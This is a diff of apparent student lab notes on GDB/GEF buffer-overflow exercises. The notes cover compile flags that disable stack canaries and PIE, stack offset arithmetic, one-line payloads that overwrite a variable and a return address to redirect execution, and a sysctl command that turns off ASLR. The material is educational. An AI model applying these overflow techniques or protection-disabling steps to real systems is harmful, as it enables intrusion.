@@ -1,16 +1,6 @@
-Differences from the doc when using GEF
+wsl -d Ubuntu
 
-Core commands (break, run, start, disas, info reg, x/..., print, set, step, next, finish, continue, info break) are plain GDB and work identically.
-
-GEF prints a context panel (registers, stack, code) at every stop, so you’ll see more output than in the doc. registers is a GEF alternative to info reg, and context redraws the panel.
-
-The x command works the same way, e.g. x/24xb main, x/24xb $eip, x/32xb $esp.
-
-Your addresses will differ from the doc’s. PIE is on, so breakpoints show small offsets like 0x12b5 before run and rebased addresses (0x5655...) after.
-
-Compile with the doc’s command: gcc -g -m32 test.c -o test.out -mpreferred-stack-boundary=2. Newer GCC may warn about or ignore that flag, so check that your disassembly looks roughly like the doc’s.
-
-
+flag.c
 gcc -m32 -g flag.c -o flag.out -fno-stack-protector -mpreferred-stack-boundary=2
 gdb -q flag.out
 gef➤  disas main
@@ -19,3 +9,44 @@ gef➤  disas main
 buffer is at ebp-0x18, flag is at ebp-0x8
 Distance: 0x18 - 0x8 = 0x10 = 16 bytes. So strcpy fills buffer[0..15] with the first 16 bytes of your input, then anything from the 17th byte onward spills into flag’s 4 bytes.
 ./flag.out $(python3 -c "print('A'*20)") -> Modified
+
+flow.c
+lea eax,[ebp-0x18]      <- this is where "buffer" lives
+cmp DWORD PTR [ebp-0x8],0x41614262   <- this is where "pattern" lives, and what it must equal
+0x18 0x8 diff is 10 hex = 16 dec -> 16 filler for buffer then 4 for pattern (int) (0x41614262)
+Computers store numbers backwards (this is just a fact of x86 computers, called “little-endian”). The number 0x41614262 is made of 4 bytes: 41 61 42 62. Stored backwards in memory, that’s 62 42 61 41. (bBaA)
+./pattern.out AAAAAAAAAAAAAAAAbBaA
+
+flow.c
+gcc -m32 -g flow.c -o flow.out -fno-stack-protector -mpreferred-stack-boundary=2 -no-pie -fno-pie
+(-fno-stack-protector turns off stack canary protection method (like checksum?))
+(PIE address randomizes address at runtime)
+   0x08049198 <+15>:    lea    eax,[ebp-0x10]
+   0x0804919b <+18>:    push   eax
+   0x0804919c <+19>:    call   0x8049040 <strcpy@plt>
+-> buffer is ebp-0x10
+objdump -d flow.out|grep change
+0000119d <change>:
+sudo sysctl kernel.randomize_va_space (= 2) (randomizes heap and stack)
+3 solutions:
+python3 -c "import subprocess; payload = b'a'*20 + b'\x76\x91\x04\x08'; subprocess.run(['./flow.out', payload])"
+./flow.out "a$(printf 'a%.0s' {1..19})"$'\x76\x91\x04\x08'
+./flow.out $'aaaaaaaaaaaaaaaaaaaa\x76\x91\x04\x08'
+
+aslr.c
+* gdb-lab/sess2$ ./aslr.out
+address of x (on stack):0xff9488f8
+address of y (on heap):0x8fc4010
+* gdb-lab/sess2$ ./aslr.out
+address of x (on stack):0xffa903b8
+address of y (on heap):0x9fca010
+* gdb-lab/sess2$ ./aslr.out
+address of x (on stack):0xffffb1a8
+address of y (on heap):0xa005010
+sudo sysctl -w kernel.randomize_va_space=0 <-- disables aslr => outputs above don't change
+* gdb-lab/sess2$ ./aslr.out
+address of x (on stack):0xffffc9b8
+address of y (on heap):0x804d010
+* gdb-lab/sess2$ ./aslr.out
+address of x (on stack):0xffffc9b8
+address of y (on heap):0x804d010
